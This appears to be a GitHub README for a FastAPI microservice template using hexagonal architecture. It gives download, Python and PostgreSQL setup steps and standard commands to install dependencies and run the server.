# 🚀 fastapi-microservice-hexagonal-template - Build Your Microservice Easily 

[![Download](https://img.shields.io/badge/Download-FastAPI%20Template-brightgreen)](https://github.com/cprtam/fastapi-microservice-hexagonal-template/releases)

## 📦 Introduction

Welcome to the fastapi-microservice-hexagonal-template project! This template helps you quickly set up a microservice using FastAPI, focused on a clean and maintainable architecture. Whether you are creating a new application or learning about FastAPI, this template serves as a strong foundation.

## 🚀 Key Features

- **Hexagonal Architecture**: This approach keeps your application code clean and organized, making it easy to test and extend.
- **FastAPI Framework**: Enjoy high performance while building your APIs quickly and efficiently.
- **Database Management**: Utilize PostgreSQL for reliable and scalable data storage.
- **Migration Support**: Use Alembic to manage your database schema updates smoothly.
- **Testing Framework**: Leverage Pytest to ensure your code works as expected.
- **Easy Deployment**: Containerize your microservice using Docker for easy deployment.

## 🛠️ System Requirements

Before you get started, ensure you have the following:

- A computer with Windows, macOS, or Linux.
- Python 3.7 or higher installed on your system.
- An internet connection to download necessary files.

## 🚀 Getting Started

1. **Visit the Releases Page**: To download the template, click the button below.

   [Download the FastAPI Microservice Template](https://github.com/cprtam/fastapi-microservice-hexagonal-template/releases)

2. **Choose the Latest Release**: On the Releases page, find the latest version. You will see various files related to the release.

3. **Download the Files**: Click on the file named `fastapi-microservice-hexagonal-template.zip` to download the template. 

4. **Extract the Files**: After downloading, locate the zip file in your downloads folder. Right-click on it and select "Extract All" to unzip the contents.

5. **Navigate to the Folder**: Open the extracted folder to find the application files.

## 🛠️ Installation

### Step 1: Install Python

If you do not have Python installed, follow these steps:

- **Windows**: Visit the [Python Download Page](https://www.python.org/downloads/windows/) and download the installer. Run the installer and make sure to check the box that says "Add Python to PATH."

- **macOS**: Python usually comes pre-installed. To check, open the terminal and type `python3 --version`. If it’s not installed, use Homebrew: `brew install python`.

- **Linux**: Use the package manager for your distribution. For example, on Ubuntu: `sudo apt-get install python3`.

### Step 2: Install Required Libraries

To set up the application, you need to install some Python libraries. Open your command prompt or terminal and navigate to the folder where you extracted the template. Run the following command:

```bash
pip install -r requirements.txt
```

### Step 3: Configure the Database

Make sure you have PostgreSQL installed. If not, download it from the [PostgreSQL website](https://www.postgresql.org/download/). 

After installation, create a new database for your application. You can do this using the PostgreSQL command line or a GUI tool like pgAdmin.

### Step 4: Update Configuration Files

Open the `config.py` file in the template folder. Here, you can set the database connection details:

```python
DATABASE_URL = "postgresql://user:password@localhost/db_name"
```

Replace `user`, `password`, and `db_name` with the appropriate values for your database.

### Step 5: Run the Application

To start your microservice, type the following command in your terminal:

```bash
uvicorn main:app --reload
```

This will start the server, and you can access the application by visiting `http://127.0.0.1:8000` in your web browser.

## 🔍 Download & Install

To download the template, click the link below:

[Download the FastAPI Microservice Template](https://github.com/cprtam/fastapi-microservice-hexagonal-template/releases)

Follow the installation steps above to set up your microservice easily.

## 🛠️ Contribution Guidelines

If you want to contribute to this project, you can follow these steps:

1. Fork the repository on GitHub.
2. Create a new branch for your changes.
3. Make your alterations and test to ensure everything works.
4. Submit a pull request with a clear description of your changes.

## 📜 License

This project is licensed under the MIT License. Feel free to use it as you wish while keeping the credits intact.

## 🏷️ Topics

This project covers various topics, including:

- alembic
- docker
- fastapi
- hexagonal-architecture
- microservice
- postgresql
- pytest
- python
- sqlmodel
- template 

Enjoy building your microservices with the fastapi-microservice-hexagonal-template!